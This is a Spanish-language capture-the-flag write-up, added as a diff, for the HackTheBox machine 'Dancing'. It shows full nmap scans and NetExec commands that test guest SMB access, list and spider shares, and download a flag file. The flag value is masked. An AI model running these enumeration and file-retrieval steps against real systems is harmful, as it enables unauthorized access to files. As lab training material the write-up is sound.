@@ -1,0 +1,143 @@
+---
+type: writeup
+title: Dancing
+description: Introduce el protocolo Server Message Block (SMB), su enumeración y su explotación cuando se configura incorrectamente para permitir el acceso sin contraseña.
+lang: es
+draft: false
+image: ../../../../images/writeups/hackthebox/machines/dancing/dancing.png
+platform: hackthebox
+url: https://app.hackthebox.com/machines/Dancing
+difficulty: veryeasy
+os: windows
+hints: [smb]
+tags: [smb]
+---
+
+## Enumeration
+
+Escaneamos todos los puertos con `nmap` para ver cuáles están abiertos y qué servicios corren en ellos.
+
+```bash
+sudo nmap -p- -sS --min-rate 5000 -Pn -n -vv -oA nmap/allports 10.129.193.219
+```
+
+```plaintext
+PORT      STATE SERVICE      REASON
+135/tcp   open  msrpc        syn-ack ttl 127
+139/tcp   open  netbios-ssn  syn-ack ttl 127
+445/tcp   open  microsoft-ds syn-ack ttl 127
+5985/tcp  open  wsman        syn-ack ttl 127
+47001/tcp open  winrm        syn-ack ttl 127
+49664/tcp open  unknown      syn-ack ttl 127
+49665/tcp open  unknown      syn-ack ttl 127
+49666/tcp open  unknown      syn-ack ttl 127
+49667/tcp open  unknown      syn-ack ttl 127
+49668/tcp open  unknown      syn-ack ttl 127
+49669/tcp open  unknown      syn-ack ttl 127
+```
+
+Escaneamos los puertos abiertos para ver más detalles de los servicios que corren en ellos.
+
+```bash
+nmap -p 135,139,445,5985,47001,49664,49665,49666,49667,49668,49669 -sCV -oA nmap/openports 10.129.193.219
+```
+
+```plaintext
+PORT      STATE SERVICE       VERSION
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  unknown
+49668/tcp open  unknown
+49669/tcp open  unknown
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 3h59m40s
+| smb2-time: 
+|   date: 2026-07-27T04:33:03
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+```
+
+El puerto 139 corre el servicio NetBIOS Session Service que permite compartir recursos. Chequeamos si podemos acceder al servicio sin contraseña.
+
+```bash
+nxc smb 10.129.193.219 -u melvin -p ""
+```
+
+```plaintext
+SMB         10.129.193.219  445    DANCING          [*] Windows 10 / Server 2019 Build 17763 x64 (name:DANCING) (domain:Dancing) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.193.219  445    DANCING          [+] Dancing\melvin: (Guest)
+```
+
+`Null Auth:True` indica que podemos conectarnos al servicio sin usuario y contraseña, `melvin` fue reconocido como `Guest`, podemos ingresar cualquier otro usuario que no exista y lo va a tomar `Guest` también.
+
+Como `Guest` podemos enumerar los recursos compartidos.
+
+```bash
+nxc smb 10.129.193.219 -u melvin -p "" --shares
+```
+
+```plaintext
+SMB         10.129.193.219  445    DANCING          [*] Windows 10 / Server 2019 Build 17763 x64 (name:DANCING) (domain:Dancing) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.193.219  445    DANCING          [+] Dancing\melvin: (Guest)
+SMB         10.129.193.219  445    DANCING          [*] Enumerated shares
+SMB         10.129.193.219  445    DANCING          Share           Permissions     Remark
+SMB         10.129.193.219  445    DANCING          -----           -----------     ------
+SMB         10.129.193.219  445    DANCING          ADMIN$                          Remote Admin
+SMB         10.129.193.219  445    DANCING          C$                              Default share
+SMB         10.129.193.219  445    DANCING          IPC$            READ            Remote IPC
+SMB         10.129.193.219  445    DANCING          WorkShares      READ,WRITE 
+```
+
+Enumeramos el contenido del recurso `WorkShares`.
+
+```bash
+nxc smb 10.129.193.219 -u melvin -p "" --spider WorkShares --regex .
+```
+
+```plaintext
+SMB         10.129.193.219  445    DANCING          [*] Windows 10 / Server 2019 Build 17763 x64 (name:DANCING) (domain:Dancing) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.193.219  445    DANCING          [+] Dancing\melvin: (Guest)
+SMB         10.129.193.219  445    DANCING          [*] Spidering .
+SMB         10.129.193.219  445    DANCING          //10.129.193.219/WorkShares/. [dir]
+SMB         10.129.193.219  445    DANCING          //10.129.193.219/WorkShares/.. [dir]
+SMB         10.129.193.219  445    DANCING          //10.129.193.219/WorkShares/Amy.J [dir]
+SMB         10.129.193.219  445    DANCING          //10.129.193.219/WorkShares/James.P [dir]
+SMB         10.129.193.219  445    DANCING          //10.129.193.219/WorkShares/Amy.J/. [dir]
+SMB         10.129.193.219  445    DANCING          //10.129.193.219/WorkShares/Amy.J/.. [dir]
+SMB         10.129.193.219  445    DANCING          //10.129.193.219/WorkShares/Amy.J/worknotes.txt [lastm:'2021-03-29 06:08' size:94]
+SMB         10.129.193.219  445    DANCING          //10.129.193.219/WorkShares/James.P/. [dir]
+SMB         10.129.193.219  445    DANCING          //10.129.193.219/WorkShares/James.P/.. [dir]
+SMB         10.129.193.219  445    DANCING          //10.129.193.219/WorkShares/James.P/flag.txt [lastm:'2021-06-03 05:37' size:32]
+```
+
+Vemos que la flag está en un directorio perteneciente al usuario `James.P`, descargamos el archivo.
+
+```bash
+nxc smb 10.129.193.219 -u melvin -p "" --share WorkShares --get-file /James.P/flag.txt flag.txt
+```
+
+```plaintext
+SMB         10.129.193.219  445    DANCING          [*] Windows 10 / Server 2019 Build 17763 x64 (name:DANCING) (domain:Dancing) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.193.219  445    DANCING          [+] Dancing\melvin: (Guest)
+SMB         10.129.193.219  445    DANCING          [*] Copying "/James.P/flag.txt" to "flag.txt"
+SMB         10.129.193.219  445    DANCING          [+] File "/James.P/flag.txt" was downloaded to "flag.txt"
+```
+
+### Flag
+
+<Callout type="success" title="Flag">
+5******************************4
+</Callout>
